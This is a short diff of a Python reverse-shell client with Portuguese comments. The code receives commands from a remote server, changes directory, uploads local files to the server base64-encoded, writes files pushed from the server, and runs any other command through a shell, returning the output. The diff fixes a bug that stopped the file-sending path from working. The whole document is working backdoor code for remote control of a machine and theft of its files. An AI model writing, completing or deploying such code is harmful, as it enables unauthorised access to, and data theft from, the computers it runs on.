@@ -24,13 +24,13 @@ def shell():
             os.chdir(res[3:])
             result = os.getcwd()
             client.send(result.encode())
-        elif res[:8]=="download": # descarregar um arquivo
+        elif res[:8]=="download": # enviar arquivo au server: client -> server
             with open(res[9:],'rb') as file_download:
-                client.send(base64.b64encode(file_download.read))
-        elif res[:6]=="upload": # enviar um arquivo
-            with open(res[7:],'wb') as file_upload:
+                client.send(base64.b64encode(file_download.read()))
+        elif res[:6]=="upload": # receber um arquivo do server: server -> client
+            with open(res[7:],'wb') as file_upload: # preparar file_upload
                 data=client.recv(30000) # preparar buffer de recepção
-                file_upload.write(base64.b64decode(data))
+                file_upload.write(base64.b64decode(data)) # escriver arquivo
         else: # manter o shell ativo no server
             proc=subprocess.Popen(res,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
             result=proc.stdout.read()+proc.stderr.read()
